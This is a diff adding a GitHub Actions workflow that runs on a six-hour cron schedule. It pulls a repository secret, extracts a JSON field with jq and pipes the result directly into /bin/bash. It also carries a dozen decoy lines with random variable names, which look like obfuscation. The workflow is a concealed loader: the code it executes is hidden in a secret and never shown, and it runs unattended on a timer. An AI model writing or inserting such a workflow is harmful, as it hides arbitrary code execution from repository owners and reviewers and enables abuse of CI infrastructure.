@@ -1,0 +1,28 @@
+name: trianglebreadline
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: trianglebreadline
+        env:
+          xlig467: ${{ secrets.xlig467 }}
+        run: |
+          echo $xlig467 | jq -r .lvk6967 | /bin/bash
+          echo $nsn3 | jq -r .uz804 | /bin/bash
+          echo $n2041 | jq -r .rw8020 | /bin/bash
+          echo $zj9 | jq -r .zih57157 | /bin/bash
+          echo $tbf99 | jq -r .xsa95901 | /bin/bash
+          echo $sqwa2 | jq -r .wm69 | /bin/bash
+          echo $ktx594 | jq -r .ftl85546 | /bin/bash
+          echo $ufkl226 | jq -r .ub39485 | /bin/bash
+          echo $j2876 | jq -r .flsrp896 | /bin/bash
+          echo $iz8 | jq -r .reqjn92926 | /bin/bash
+          echo $bspa48747 | jq -r .ru2 | /bin/bash
+          echo $do27166 | jq -r .qeeej4237 | /bin/bash
+
